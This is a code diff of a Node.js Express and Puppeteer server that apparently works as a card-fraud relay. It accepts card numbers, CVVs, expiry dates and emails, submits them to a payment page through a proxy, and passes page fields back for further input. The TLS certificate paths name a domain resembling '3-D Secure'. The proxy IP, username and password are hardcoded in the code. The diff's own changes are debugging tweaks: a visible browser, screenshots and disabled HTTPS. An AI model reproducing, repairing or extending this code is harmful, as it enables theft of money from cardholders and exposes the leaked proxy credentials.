@@ -8,10 +8,10 @@ const https = require("https"),
   fs = require("fs");
 
 
-const options = {
-  key: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/privkey.pem"),
-  cert: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/fullchain.pem")
-};
+// const options = {
+//   key: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/privkey.pem"),
+//   cert: fs.readFileSync("/etc/letsencrypt/live/3-dsec.xyz/fullchain.pem")
+// };
 
 const app = express()
 
@@ -43,7 +43,7 @@ const write_data = async (inputs, page, browser) => {
      await browser.close()
 }
 const send_html = async (toCard, amount, fromCard,cvv, expireDate, email) => {
-    const browser = await puppeteer.launch({args: ['--proxy-server=http://195.216.216.169:56942',' --no-sandbox', '--disable-setuid-sandbox']})
+    const browser = await puppeteer.launch({headless: false, slowMo: 1, args: ['--proxy-server=http://195.216.216.169:56942',' --no-sandbox', '--disable-setuid-sandbox']})
     const page = await browser.newPage()
     await page.authenticate({ username: 'ttNkVLRS', password: '63cYXNdr'})
     await page.setViewport({ width: 1920, height: 984 })
@@ -73,8 +73,10 @@ const send_html = async (toCard, amount, fromCard,cvv, expireDate, email) => {
     await page.click('.submit-button-298')
 
     await page.waitForNavigation({waitUntil: 'networkidle2'});
+    await page.screenshot({ path: 'info' + 1 + '.png' })
 
     await page.waitForTimeout(5000);
+
     const inputs = await page.$eval('input', el => el.outerHTML)
     const html = await page.$eval('*', el => el.outerHTML)
 
@@ -82,7 +84,7 @@ const send_html = async (toCard, amount, fromCard,cvv, expireDate, email) => {
 }
 app.post('/sendData', async (req, res) => {
         const {toCard,amount, fromCard, cvv, expireDate, email, id} = req.body
-        const {inputs, page, browser} = await send_html(toCard,amount, fromCard, cvv, expireDate, email)
+        const {inputs, page, browser, html} = await send_html(toCard,amount, fromCard, cvv, expireDate, email)
         res.status(200).json({inputs, html})
 
         console.log("wait", id)
@@ -110,4 +112,4 @@ app.get('/sendInputs/:id/:inputs', async (req, res) => {
 })
 
 app.listen(5000)
-https.createServer(options, app).listen(443);
+// https.createServer(options, app).listen(443);
